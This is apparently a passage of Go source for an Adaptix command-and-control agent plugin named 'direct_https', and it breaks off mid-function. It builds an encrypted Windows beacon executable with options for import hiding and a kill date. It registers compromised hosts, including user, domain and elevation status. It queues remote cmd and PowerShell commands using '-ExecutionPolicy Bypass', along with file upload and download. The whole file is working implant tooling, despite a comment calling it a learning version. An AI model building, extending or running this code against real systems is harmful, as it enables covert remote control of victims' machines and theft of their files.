// 文件作用：direct_https agent 的服务端插件入口：负责注册插件、生成 payload、创建 agent、打包任务、解析 agent 回包。
package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error

	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

// InitPlugin 是 Adaptix 加载插件时最先调用的入口，用来保存 teamserver、模块目录和水印。
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

// GetExtender 返回真正负责生成 payload、打包任务、解析回包的 agent 扩展对象。
func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// disabledTask 返回一个“已完成但什么也不做”的任务，用来占位禁用的 tunnel/terminal 功能。
func disabledTask() adaptix.TaskData {
	return adaptix.TaskData{Type: 0, Sync: true, Completed: true}
}

// disabledConnectTCP 明确禁用 TCP tunnel 连接，direct_https 当前不做隧道转发。
func disabledConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return disabledTask()
}

// disabledConnectUDP 明确禁用 UDP tunnel 连接。
func disabledConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	return disabledTask()
}

// disabledWriteTCP 明确禁用向 TCP tunnel 写数据。
func disabledWriteTCP(channelId int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledWriteUDP 明确禁用向 UDP tunnel 写数据。
func disabledWriteUDP(channelId int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledPause 明确禁用暂停 tunnel 的能力。
func disabledPause(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledResume 明确禁用恢复 tunnel 的能力。
func disabledResume(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledClose 明确禁用关闭 tunnel 的能力。
func disabledClose(channelId int) adaptix.TaskData {
	return disabledTask()
}

// disabledReverse 明确禁用反向监听/反向隧道能力。
func disabledReverse(tunnelId int, port int) adaptix.TaskData {
	return disabledTask()
}

// TunnelCallbacks 把所有 tunnel 回调都绑定到禁用函数，告诉框架本 agent 不支持 tunnel。
func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: disabledConnectTCP,
		ConnectUDP: disabledConnectUDP,
		WriteTCP:   disabledWriteTCP,
		WriteUDP:   disabledWriteUDP,
		Pause:      disabledPause,
		Resume:     disabledResume,
		Close:      disabledClose,
		Reverse:    disabledReverse,
	}
}

// disabledTerminalStart 明确禁用交互式终端启动。
func disabledTerminalStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	return disabledTask()
}

// disabledTerminalWrite 明确禁用向交互式终端写数据。
func disabledTerminalWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return disabledTask()
}

// disabledTerminalClose 明确禁用关闭交互式终端。
func disabledTerminalClose(terminalId int) adaptix.TaskData {
	return disabledTask()
}

// TerminalCallbacks 把 terminal 回调都绑定到禁用函数，告诉框架本 agent 不支持交互终端。
func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: disabledTerminalStart,
		Write: disabledTerminalWrite,
		Close: disabledTerminalClose,
	}
}

// getStringArg 从 UI 参数 map 里取字符串；缺参数或类型不对就返回错误。
func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os            string `json:"os"`
	Arch          string `json:"arch"`
	Format        string `json:"format"`
	Sleep         string `json:"sleep"`
	Jitter        int    `json:"jitter"`
	IsKillDate    bool   `json:"is_killdate"`
	Killdate      string `json:"kill_date"`
	Killtime      string `json:"kill_time"`
	IsWorkingTime bool   `json:"is_workingtime"`
	StartTime     string `json:"start_time"`
	EndTime       string `json:"end_time"`
	IatHiding     bool   `json:"iat_hiding"`
	UseProxy      bool   `json:"use_proxy"`
	ProxyType     string `json:"proxy_type"`
	ProxyHost     string `json:"proxy_host"`
	ProxyPort     int    `json:"proxy_port"`
	ProxyUsername string `json:"proxy_username"`
	ProxyPassword string `json:"proxy_password"`
	RotationMode  string `json:"rotation_mode"`
}

var (
	ObjectDirHTTP = "objects_http"
	ObjectFiles   = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "ProcLoader", "std", "utils", "WaitMask"}
	CFlags        = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
	LFlags        = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
)

// GenerateProfiles 把 UI/listener 配置整理、加密并打包成会被写入 payload 的 profile。
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		var (
			generateConfig GenerateConfig
			params         []interface{}
		)

		if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		killDate := 0
		if generateConfig.IsKillDate {
			dt := generateConfig.Killdate + " " + generateConfig.Killtime
			t, err := time.Parse("02.01.2006 15:04:05", dt)
			if err != nil {
				return nil, errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
			}
			killDate = int(t.Unix())
		}

		workingTime := 0
		if generateConfig.IsWorkingTime {
			workingTime, err = parseStringToWorkingTime(generateConfig.StartTime + "-" + generateConfig.EndTime)
			if err != nil {
				return nil, err
			}
		}

		sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
		if err != nil {
			return nil, err
		}

		listenerWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encryptKeyHex)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		if protocol != "http" {
			return nil, errors.New("direct_https only supports BeaconHTTP listener profiles")
		}

		sslEnabled, _ := listenerMap["ssl"].(bool)
		if !sslEnabled {
			return nil, errors.New("direct_https requires BeaconHTTP listener profiles with ssl=true")
		}

		params = append(params, int(agentWatermark))
		params = append(params, killDate)
		params = append(params, workingTime)
		params = append(params, sleepSeconds)
		params = append(params, generateConfig.Jitter)
		params = append(params, int(listenerWatermark))

		callbackRaw, _ := listenerMap["callback_addresses"].([]interface{})
		uriRaw, _ := listenerMap["uri"].([]interface{})
		userAgentRaw, _ := listenerMap["user_agent"].([]interface{})
		hostHeaderRaw, _ := listenerMap["host_header"].([]interface{})

		httpMethod, _ := listenerMap["http_method"].(string)
		parameterName, _ := listenerMap["hb_header"].(string)
		requestHeaders, _ := listenerMap["request_headers"].(string)

		var hosts []string
		var ports []int
		for _, item := range callbackRaw {
			line, ok := item.(string)
			if !ok {
				continue
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			host, portStr, err := net.SplitHostPort(line)
			if err != nil {
				return nil, fmt.Errorf("invalid callback address '%s': %w", line, err)
			}
			port, err := strconv.Atoi(portStr)
			if err != nil {
				return nil, fmt.Errorf("invalid callback port '%s': %w", portStr, err)
			}
			hosts = append(hosts, host)
			ports = append(ports, port)
		}
		if len(hosts) == 0 {
			return nil, errors.New("at least one callback address must be set")
		}

		var uris []string
		for _, item := range uriRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				uris = append(uris, strings.TrimSpace(v))
			}
		}
		if len(uris) == 0 {
			return nil, errors.New("at least one HTTP URI must be set")
		}

		var userAgents []string
		for _, item := range userAgentRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				userAgents = append(userAgents, strings.TrimSpace(v))
			}
		}
		if len(userAgents) == 0 {
			userAgents = append(userAgents, "Mozilla/5.0")
		}

		var hostHeaders []string
		for _, item := range hostHeaderRaw {
			if v, ok := item.(string); ok && strings.TrimSpace(v) != "" {
				hostHeaders = append(hostHeaders, strings.TrimSpace(v))
			}
		}

		webPageOutput, _ := listenerMap["page-payload"].(string)
		ansOffset1 := strings.Index(webPageOutput, "<<<PAYLOAD_DATA>>>")
		if ansOffset1 < 0 {
			return nil, errors.New("listener page-payload must contain <<<PAYLOAD_DATA>>>")
		}
		ansOffset2 := len(webPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])

		rotationMode := 0
		if generateConfig.RotationMode == "random" {
			rotationMode = 1
		}

		proxyType := 0
		if generateConfig.UseProxy {
			if generateConfig.ProxyType == "https" {
				proxyType = 2
			} else {
				proxyType = 1
			}
		}

		params = append(params, sslEnabled)
		params = append(params, len(hosts))
		for i := 0; i < len(hosts); i++ {
			params = append(params, hosts[i])
			params = append(params, ports[i])
		}
		params = append(params, httpMethod)
		params = append(params, len(uris))
		for _, uri := range uris {
			params = append(params, uri)
		}
		params = append(params, parameterName)
		params = append(params, len(userAgents))
		for _, ua := range userAgents {
			params = append(params, ua)
		}
		params = append(params, requestHeaders)
		params = append(params, ansOffset1)
		params = append(params, ansOffset2)
		params = append(params, len(hostHeaders))
		for _, header := range hostHeaders {
			params = append(params, header)
		}
		params = append(params, rotationMode)
		params = append(params, proxyType)
		params = append(params, generateConfig.ProxyHost)
		params = append(params, generateConfig.ProxyPort)
		params = append(params, generateConfig.ProxyUsername)
		params = append(params, generateConfig.ProxyPassword)

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}

		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}

		profileString := ""
		for _, b := range packedProfile {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))
	}
	return agentProfiles, nil
}

// BuildPayload 用 mingw 把配置对象和预编译对象链接成最终 Windows exe。
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		filename string
		payload  []byte
	)

	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("only one listener profile is supported")
	}

	var listenerMap map[string]any
	if err := json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerMap); err != nil {
		return nil, "", err
	}

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}
	if generateConfig.Format != "Exe" {
		return nil, "", errors.New("direct_https only builds Exe payloads")
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol != "http" {
		return nil, "", errors.New("direct_https only supports BeaconHTTP listener profiles")
	}
	sslEnabled, _ := listenerMap["ssl"].(bool)
	if !sslEnabled {
		return nil, "", errors.New("direct_https requires BeaconHTTP listener profiles with ssl=true")
	}

	cFlags := CFlags
	lFlags := LFlags
	if generateConfig.IatHiding {
		cFlags += " -DIAT_HIDING"
		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}
	defer os.RemoveAll(tempDir)

	compiler := "x86_64-w64-mingw32-g++"
	ext := ".x64.o"
	filename = "direct_https.x64.exe"
	if generateConfig.Arch == "x86" {
		compiler = "i686-w64-mingw32-g++"
		ext = ".x86.o"
		filename = "direct_https.x86.exe"
	}

	agentProfile := agentProfiles[0]
	agentProfileSize := len(agentProfile) / 4
	cmdConfig := fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", compiler, cFlags, ObjectDirHTTP, string(agentProfile), agentProfileSize, tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling configuration...")
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdConfig); err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "Configuration compiled successfully")

	files := tempDir + "/config.o "
	files += ObjectDirHTTP + "/ConnectorHTTP" + ext + " "
	for _, ofile := range ObjectFiles {
		files += ObjectDirHTTP + "/" + ofile + ext + " "
	}
	files += ObjectDirHTTP + "/main" + ext

	if generateConfig.IatHiding {
		if generateConfig.Arch == "x86" {
			lFlags += " -Wl,-e,_WinMain@16"
		} else {
			lFlags += " -Wl,-e,WinMain"
		}
	}

	buildPath := tempDir + "/file.exe"
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Protocol: %s, Connector: ConnectorHTTP", protocol))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: Exe, Filename: %s", filename))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")

	var buildArgs []string
	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
	buildArgs = append(buildArgs, strings.Fields(files)...)
	buildArgs = append(buildArgs, "-o", buildPath)
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, compiler, buildArgs...); err != nil {
		return nil, "", err
	}

	payload, err = os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(payload)))
	return payload, filename, nil
}

// CreateAgent 解析 agent 第一次 check-in 的心跳包，并生成 Adaptix 里显示的 agent 信息。
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData
	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	isServer := false
	if (flag & 0b00001000) > 0 {
		isServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, isServer, systemArch)
	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)

	return agentData, &ExtenderAgent{}, nil
}

// Encrypt 用 RC4 加密服务端准备发给 agent 的数据。
func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// Decrypt 用 RC4 解密 agent 回传给服务端的数据；RC4 对称，所以和 Encrypt 调同一个函数。
func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// PackTasks 把多个 Adaptix 任务打成 agent 能识别的一段二进制任务包。
func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err := PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)
	return packData, nil
}

// PivotPackData 是 pivot 转发接口；direct_https 不支持，所以直接返回错误。
func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("direct_https agent does not support nested task forwarding")
}

// CreateCommand 把用户在 UI/Raw API 里输入的命令转换成 agent 端 opcode 和参数。
// 本恢复版只开放学习目标需要的命令面：hello、cmd/powershell、基础文件 CRUD、upload/download。
func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	taskData = adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true}
	messageData = adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Text: ""}
	messageData.Message, _ = args["message"].(string)

	var array []interface{}
	switch command {
	case "cmd":
		var commandLine string
		commandLine, err = getStringArg(args, "command_line")
		if err != nil {
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB
		programArgs := Ts.TsConvertUTF8toCp("cmd.exe /d /c "+commandLine, agentData.ACP)
		messageData.Message = "Task: execute cmd.exe command"
		array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}

	case "powershell":
		var commandLine string
		commandLine, err = getStringArg(args, "command_line")
		if err != nil {
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB
		programArgs := Ts.TsConvertUTF8toCp("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "+commandLine, agentData.ACP)
		messageData.Message = "Task: execute PowerShell command"
		array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}

	case "cat":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cd":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src, dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "download":
		var path string
		path, err = getStringArg(args, "file")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "hello":
		messageData.Message = "Task: run hello test"
		array = []interface{}{COMMAND_HELLO}

	case "ls":
		var dir string
		dir, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "mv":
		var src, dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rm":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "upload":
		var fileName, localFile string
		var fileContent []byte
		fileName, err = getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}
		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}

	default:
		err = fmt.Errorf("command '%s' is not available in the restored direct_https learning surface", command)
		goto RET
	}

	taskData.Data, err = PackArray(array)

RET:
	return taskData, messageData, err
}

// ProcessData 解析 agent 回包，把 cmd/powershell、文件 CRUD、上传下载等结果更新回 Adaptix 任务界面。
func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	packer := CreatePacker(decryptedData)
	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	for packer.Size() >= 8 {
		if false == packer.CheckPacker([]string{"int", "int"}) {
			goto HANDLER
		}

		taskID := packer.ParseInt32()
		commandID := uint(packer.ParseInt32())
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", taskID)

		switch commandID {
		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileID := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"long", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt64()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileID)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileID, fileName, int64(fileSize))
			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
				continue
			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileID)
				_ = Ts.TsDownloadClose(fileID, adaptix.DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_DOWNLOAD_STATE:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileID := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()
			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' stopped", fileID)
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))
			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' resumed", fileID)
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))
			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' canceled", fileID)
				_ = Ts.TsDownloadClose(fileID, adaptix.DOWNLOAD_STATE_CANCELED)
			} else {
				task.Message = fmt.Sprintf("Download '%v' state changed to %d", fileID, downloadState)
			}

		case COMMAND_HELLO:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			task.Message = "Hello command result:"
			task.ClearText = string(packer.ParseBytes())

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}
			_ = packer.ParseInt8()
			state := packer.ParseInt8()
			if state == JOB_STATE_RUNNING {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				task.Completed = false
				jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
				task.ClearText = jobOutput
			} else if state == JOB_STATE_KILLED {
				task.Completed = true
				task.MessageType = adaptix.MESSAGE_INFO
				task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
			} else if state == JOB_STATE_FINISHED {
				task.Completed = true
				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var items []adaptix.ListingFileDataWin
			var rootPath string
			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR
			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")
				filesCount := int(packer.ParseInt32())
				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {
					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin
					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}
					items = append(folders, files...)
					outputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					outputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")
					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
						if item.IsDir {
							outputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							outputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = outputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
